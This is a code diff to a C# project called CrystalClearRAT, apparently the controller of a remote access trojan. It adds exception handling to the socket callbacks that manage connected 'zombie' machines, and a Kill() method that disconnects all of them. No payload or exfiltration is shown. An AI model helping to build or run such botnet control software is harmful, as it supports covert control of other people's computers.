@@ -80,6 +80,13 @@ namespace CrystalClearRAT.Web
                     zombie.Destroy();
                     sendingDone.Set();
                 }
+                catch (ObjectDisposedException)
+                {
+                    Console.WriteLine("Zombie disposed. Cleaning up.");
+                    zombie.Destroy();
+                    sendingDone.Set();
+                }
+
             });
 
             SendMonitor();
@@ -104,8 +111,22 @@ namespace CrystalClearRAT.Web
 
         private static void AcceptCallback(IAsyncResult ar)
         {
-            Socket accepted = ServerSocket.EndAccept(ar);
+            Socket accepted;
 
+            try
+            {
+              accepted = ServerSocket.EndAccept(ar);
+            }
+            catch (ObjectDisposedException)
+            {   
+                return;
+            }          
+            catch(NullReferenceException)
+            {
+                return;
+            }
+
+            
             IPEndPoint acceptedEndPoint = (IPEndPoint)accepted.RemoteEndPoint;
 
             Zombie zombie;
@@ -135,9 +156,29 @@ namespace CrystalClearRAT.Web
                 zombie.Destroy();
 
             }
+            catch (ObjectDisposedException)
+            {
+                Console.WriteLine("Zombie disposed. Cleaning up.");
+                zombie.Destroy();
+            }
 
 
 
+        }
+
+        public static void Kill()
+        {
+            foreach (Zombie z in Zombie.Zombies)
+            {
+                z.Socket.Shutdown(SocketShutdown.Both);
+            }
+
+            ServerSocket.Close();
+
+           
+            IsRunning = false;
+            ServerSocket = null;
+            App.Current.Dispatcher.Invoke(() => { Zombie.Zombies.Clear(); });
         }
 
         private static void ReceiveCallback(IAsyncResult ar)
